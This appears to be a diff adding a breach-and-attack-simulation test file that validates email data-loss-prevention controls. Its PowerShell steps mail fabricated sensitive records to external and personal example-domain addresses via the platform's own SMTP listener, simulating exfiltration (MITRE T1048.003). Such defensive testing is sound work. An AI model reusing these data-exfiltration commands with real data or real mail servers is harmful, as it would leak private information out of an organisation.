@@ -1,0 +1,114 @@
+id: dlp-exfiltration-email-recipients
+name: DLP Exfiltration Validation — Email Recipient Variants (External and Personal)
+description: >
+  Sends the same synthetic multi-type sensitive record used by
+  dlp-exfiltration-smtp.yaml to two recipient types that a mail DLP policy
+  normally scopes differently from internal mail: an external business
+  recipient, and a personal mail address. The message is delivered to this
+  platform's own SMTP listener, which accepts one recipient per message and
+  does not check the recipient's domain, so the envelope recipient can be
+  external. Nothing is sent to any real mail server.
+
+  Verdict comes from the same sink-verified path as dlp-exfiltration-smtp.yaml:
+  a receipt is written only if the listener receives a message whose Subject
+  exactly matches this run's token. A receipt proves the message left the
+  endpoint over SMTP. It does not prove a mail gateway should have stopped it.
+
+  Not covered here, deliberately: attachments (the listener rejects multipart
+  content, so an attachment variant could never produce a receipt) and
+  multi-recipient messages (the listener accepts one recipient). Encrypted-mail
+  and mail-exception cases need a policy to test against and are not built.
+
+  Safety: all synthetic data is fabricated ([BAS-SIM-DLP] tagged). The
+  addresses use the reserved example.org and example.com domains (RFC 2606).
+  The SMTP listener stores only a hash of the message body. Windows only.
+author: Audspect Research
+executable: true
+supported_os: [windows]
+tags:
+  - dlp
+  - data-protection-validation
+  - exfiltration
+  - email
+  - windows
+  - mitre-attack
+mitre_phases:
+  - collection
+  - exfiltration
+
+steps:
+  - name: "DLP Validation — SMTP Exfiltration to External Business Recipient (T1048.003)"
+    technique_id: T1048.003
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Sends one small synthetic email to the platform's own SMTP listener with an external example.org envelope recipient. No real mail server is contacted and no message leaves the environment."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SMTP sink port"
+      - "Sysmon EID 1: powershell.exe (Send-MailMessage) network activity"
+    detection:
+      - "DLP/mail-gateway: outbound mail to an external recipient carrying regulated-data patterns"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
+      $token = "{{SINK_TOKEN}}"
+      $body = "$token`n$csvContent"
+      try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
+        Send-MailMessage -From "dlptest@sink.audspect.local" -To "sim-partner@example.org" `
+          -Subject $token -Body $body `
+          -SmtpServer "{{SINK_SMTP_HOST}}" -Port {{SINK_SMTP_PORT}} `
+          -ErrorAction Stop
+        Write-Output "DLP_OBSERVATION: send_mail_result=success"
+        Write-Output "EXEC T1048.003: external-recipient SMTP attempt completed (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP-EXT]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: send_mail_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1048.003: external-recipient SMTP attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP-EXT]"
+      }
+      # The verdict is graded server-side from the sink receipt, never from this script.
+    cleanup: ""
+
+  - name: "DLP Validation — SMTP Exfiltration to Personal Mail Address (T1048.003)"
+    technique_id: T1048.003
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Sends one small synthetic email to the platform's own SMTP listener with a personal-mail example.com envelope recipient. No real mail server is contacted and no message leaves the environment."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SMTP sink port"
+      - "Sysmon EID 1: powershell.exe (Send-MailMessage) network activity"
+    detection:
+      - "DLP/mail-gateway: outbound mail to a personal mailbox carrying regulated-data patterns"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
+      $token = "{{SINK_TOKEN}}"
+      $body = "$token`n$csvContent"
+      try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
+        Send-MailMessage -From "dlptest@sink.audspect.local" -To "sim-personal@example.com" `
+          -Subject $token -Body $body `
+          -SmtpServer "{{SINK_SMTP_HOST}}" -Port {{SINK_SMTP_PORT}} `
+          -ErrorAction Stop
+        Write-Output "DLP_OBSERVATION: send_mail_result=success"
+        Write-Output "EXEC T1048.003: personal-address SMTP attempt completed (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP-PERS]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: send_mail_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1048.003: personal-address SMTP attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP-PERS]"
+      }
+      # The verdict is graded server-side from the sink receipt, never from this script.
+    cleanup: ""
